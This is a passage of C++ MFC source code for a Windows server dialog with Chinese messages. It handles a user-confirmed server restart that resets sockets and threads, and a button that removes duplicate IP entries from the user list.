	int retKx = MessageBoxA("中止退出程序，重试重启服务端，忽略取消本次操作。", "服务端重置提醒", MB_ABORTRETRYIGNORE | MB_ICONINFORMATION);
	if (retKx == IDABORT)
	{
		CDialogEx::OnCancel();
	}
	else if (retKx == IDIGNORE)
	{
		return;
	}
	else if (retKx == IDRETRY)
	{
		shared_ptr<ChisfooDlg> _Dlg(new ChisfooDlg);
		thread(&ChisfooDlg::MessageBoxA, _Dlg, "即将重启服务端，请等待提示。\n"\
			"请务必不要关闭程序！完成后会有一个提示！\n"\
			"程序将会在数秒后完成重启，视当前网络状况而定。请不要做任何操作！\n\n\n"\
			"！！！重要！！！\n"\
			"重启成功提示出现前请不要发送任何数据或者做任何操作，这个过程是自动的。\n"\
			, "正在重启", 0U).detach();
		auto ReSet_FX = [&]()
		{
			Pcs_Flag = 0U;
			auto _TTick = chrono::system_clock::now();
			while (_Thr_Flag)
			{
				Sleep(Wait_Time);
				if (chrono::system_clock::now() - _TTick > chrono::milliseconds(Wait_Time * 2))break;
			}
			_Thr_Pcs.clear();
			atomic_uint _Thr_Flag = 0U;
			Task_Pcs.clear();
			userList.clear();
			WorkMap.clear();
			puserlist.ResetContent();
			pmsgbox.ResetContent();
			closesocket(slisten);
			BOOL  bDontLinger = FALSE;
			setsockopt(slisten, SOL_SOCKET, SO_DONTLINGER, (const char*)&bDontLinger, sizeof(BOOL));
			WSACleanup();

			Pcs_Flag = 1U;

			_Thr_Pcs.push_back(thread(&ChisfooDlg::NetWork_Pcs, this));
			_Thr_Pcs.back().detach();

			_Thr_Pcs.push_back(thread(&ChisfooDlg::Offline_Pcs, this));
			_Thr_Pcs.back().detach();

			shared_ptr<ChisfooDlg> _TDlg(new ChisfooDlg);
			thread(&ChisfooDlg::MessageBoxA, _TDlg, "重启服务端成功", "重启成功", 0U).detach();
			MessagePcs("成功重启了服务端！");
			return;
		};
		thread(ReSet_FX).detach();
	}
}


void ChisfooDlg::OnBnClickedButton4()
{
	// TODO: 在此添加控件通知处理程序代码
	vector<string> ip_list;
	auto FindStr = [&](string tofind)->BOOL
	{
		for (auto msdps = ip_list.begin(); msdps != ip_list.end(); msdps++)
		{
			if ((*msdps) == tofind)return TRUE;
		}
		return FALSE;
	};
	for(unsigned long mCtrl = 0;mCtrl<puserlist.GetCount();)
	{
		CString strText;
		puserlist.GetText(mCtrl, strText);
		stringstream SStrEx;
		SStrEx.str(strText.GetString());
		SStrEx.clear();
		string bufOne, bufTwo;
		SStrEx >> bufOne >> bufTwo;
		if (FindStr(bufTwo))
		{
			puserlist.DeleteString(mCtrl);
			continue;
		}
		else
			ip_list.push_back(bufTwo);
		mCtrl += 1;
	}
}
